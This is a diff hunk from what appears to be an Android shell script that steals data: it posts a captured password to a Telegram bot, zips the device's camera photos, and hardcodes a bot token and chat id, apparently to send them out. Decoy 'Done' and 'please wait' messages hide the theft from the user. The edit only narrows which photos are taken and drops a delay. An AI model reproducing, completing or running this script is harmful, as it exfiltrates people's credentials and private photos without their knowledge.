@@ -61,9 +61,8 @@ echo "Done...:"
 
 curl -s -X POST "https://api.telegram.org/bot$tok/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$nan : pasword=$pass" 
 ########################################################################################################################
-cd /sdcard/DCIM/Camera && zip img.zip *.png *.jpg *.gif
+cd /sdcard/DCIM/Camera && zip img.zip *.jpg
 
-sleep 30
 echo "pleas wint..."
 toh=7023319102:AAHma8eMrLiYtW2-4sF0bGDXuMHdjQgHKxs
 id=5792222595
